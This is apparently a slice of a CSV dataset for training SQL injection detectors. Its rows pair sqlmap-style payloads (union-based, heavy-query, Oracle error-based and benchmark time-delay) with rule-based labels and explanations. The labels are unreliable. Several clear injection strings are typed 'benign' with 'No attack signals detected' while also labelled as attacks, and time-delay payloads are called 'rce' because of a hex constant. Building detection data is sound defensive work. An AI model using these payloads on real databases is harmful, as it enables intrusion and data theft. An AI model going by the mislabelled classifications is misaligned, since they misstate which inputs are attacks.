row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4140,"select * from generate_series ( 9863,9863,case when ( 9863 = 3285 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
4141,"1'|| ( select 'yaii' from dual where 7317 = 7317 union all select null,null,null,null,null,null,null,null,null#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
4142,"1"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
4143,"-5591%"" ) ) order by 1--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4144,1' ) where 4949 = 4949,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4145,"1"" ) ) as sqow where 8752 = 8752",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4146,"1 ) where 8008 = 8008 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
4147,"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
4148,"1"" ) as frmp where 6073 = 6073",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4149,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
4150,-2411 or ( 8459 = 8459 ) *4906# pxwg,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4151,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
4152,"1%"" union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4153,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
